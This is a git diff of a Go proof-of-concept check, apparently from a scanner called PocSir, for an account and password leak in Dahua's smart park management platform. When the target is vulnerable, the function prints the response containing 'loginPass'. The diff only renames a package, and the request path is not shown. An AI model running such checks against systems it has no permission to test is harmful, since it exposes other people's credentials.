@@ -1,7 +1,7 @@
 package poc
 
 import (
-	"PocSir/common"
+	"PocSir/config"
 	"crypto/tls"
 	"io"
 	"net/http"
@@ -27,7 +27,7 @@ func DaHua_sys_user(target string) {
 	}
 	request, err := http.NewRequest("GET", pocUrl, nil)
 	if err != nil {
-		common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
+		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
 		return
 	}
 	for key, value := range headers {
@@ -35,15 +35,15 @@ func DaHua_sys_user(target string) {
 	}
 	resp, err := client.Do(request)
 	if err != nil {
-		common.ErrMsg.Printf("[-]%s is timeout\n", target)
+		config.ErrMsg.Printf("[-]%s is timeout\n", target)
 		return
 	}
 	defer resp.Body.Close()
 	data, _ := io.ReadAll(resp.Body)
 	if resp.StatusCode == http.StatusOK && strings.Contains(string(data), "loginPass") {
-		common.Right.Printf("[+]%s存在大华智慧园区综合管理平台账号密码泄漏漏洞\n", target)
-		common.TextPut.Printf(string(data) + "\n")
+		config.Right.Printf("[+]%s存在大华智慧园区综合管理平台账号密码泄漏漏洞\n", target)
+		config.TextPut.Printf(string(data) + "\n")
 	} else {
-		common.ErrMsg.Printf("[-]%s不存在大华智慧园区综合管理平台账号密码泄漏漏洞\n", target)
+		config.ErrMsg.Printf("[-]%s不存在大华智慧园区综合管理平台账号密码泄漏漏洞\n", target)
 	}
 }
